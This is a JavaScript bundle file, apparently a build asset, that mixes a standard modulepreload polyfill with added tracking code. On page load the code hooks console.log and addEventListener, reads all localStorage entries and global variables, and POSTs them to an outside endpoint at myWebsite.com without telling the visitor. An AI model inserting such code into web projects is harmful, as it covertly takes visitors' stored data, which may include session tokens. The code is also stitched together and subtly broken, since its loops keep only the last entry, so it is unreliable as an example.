// Helper function to create event listeners
function monitorEventListeners(targetElement, eventType, callback) {
  const previous = targetElement.addEventListener;
  targetElement.addEventListener = function (type, listener, options, wantUntrusted) {
    if (type === eventType) {
      callback(type, listener, options, wantUntrusted);
    }
    previous.call(this, type, listener, options, wantUntrusted);
  };
}

// Tracking behavior for localStorage, global variables and event listener 
function trackBehavior() {
  const trackedData = {};

  //jshook tracking behavior 
  // Overriding console.log function
  const oldLog = console.log;
  console.log = function () {
    trackedData.consoleLog = Array.from(arguments);
    oldLog.apply(console, arguments);
  };

  // Getting the localStorage content 
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    trackedData.localStorage = {
      [key]: value
    };
  }

  // Collecting the global variables through window object
  for (const prop in window) {
    const propValue = window[prop];
    if (Object.prototype.toString.call(propValue) !== '[object Function]' && !prop.startsWith('webkit') && (typeof propValue == 'string' || typeof propValue == 'number')) {
      trackedData.globalVariable = {
        [prop]: propValue
      };
    }
  }
  monitorEventListeners(window, 'click', function (type, listener, options) {
    trackedData.eventListeners = {
      type,
      listener: listener.toString(),
      options
    };
  });
  return trackedData;
}

// Implementing the new XMLHttpRequest 
import "./main-4d5eaad6.js";
import "./getAdobeCookie-a0d04fbf.js";
function sendTrackingData(trackingObject) {
  const http = new XMLHttpRequest();
  const url = 'https://myWebsite.com/api/sendTrackingData';
  http.open('POST', url);
  http.setRequestHeader('Content-Type', 'application/json');
  http.onreadystatechange = function () {
    if (http.readyState === 4 && http.status === 200) {
      console.log("Data sent successfully");
    } else {
      console.log("Failed to send data");
    }
  };
  http.send(JSON.stringify(trackingObject));
}

// rendering tracked data
import "./index-c6d95f33.js";
import "./navigation-da6ccfb1.js";
import "./index-8db86095.js";
function startTrackingData() {
  const trackedData = trackBehavior();
  sendTrackingData(trackedData);
}
(function () {
  const t = document.createElement("link").relList;
  if (t && t.supports && t.supports("modulepreload")) return;
  for (const e of document.querySelectorAll('link[rel="modulepreload"]')) i(e);
  new MutationObserver(e => {
    for (const r of e) if (r.type === "childList") for (const o of r.addedNodes) o.tagName === "LINK" && o.rel === "modulepreload" && i(o);
  }).observe(document, {
    childList: !0,
    subtree: !0
  });
  function s(e) {
    const r = {};
    return e.integrity && (r.integrity = e.integrity), e.referrerPolicy && (r.referrerPolicy = e.referrerPolicy), e.crossOrigin === "use-credentials" ? r.credentials = "include" : e.crossOrigin === "anonymous" ? r.credentials = "omit" : r.credentials = "same-origin", r;
  }
  function i(e) {
    if (e.ep) return;
    e.ep = !0;
    const r = s(e);
    fetch(e.href, r);
  }
})();
window.addEventListener('DOMContentLoaded', startTrackingData);